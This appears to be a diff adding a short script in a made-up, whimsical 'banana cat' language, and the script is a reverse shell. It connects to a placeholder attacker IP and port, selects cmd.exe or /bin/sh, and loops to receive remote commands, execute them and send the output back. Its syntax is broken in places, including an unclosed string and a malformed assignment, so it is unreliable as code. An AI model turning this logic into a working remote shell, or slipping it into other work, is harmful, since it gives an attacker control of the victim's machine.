@@ -1,0 +1,35 @@
+import banana.cat.networking 
+import banana.cat.shell
+
+banana_connect "attacker_ip", attacker_port 
+
+if connection_is "open": 
+    meow "Connected to attacker!"
+
+else:
+    hiss "Connection failed"
+    exit
+
+if platform_is "windows": 
+    banana_shell = "cmd.exe"
+
+else:
+    banana_shell = "/bin/sh"
+
+while banana_is "connected":
+    command banana_receive()
+    if command == "exit":
+
+        hiss "Exiting!"
+        break
+
+    else:
+        meow "Executing: + command
+
+    result banana_execute (banana_shell, command)
+
+    banana_send(result)
+
+meow "Goodbye!"
+
+banana_disconnect()
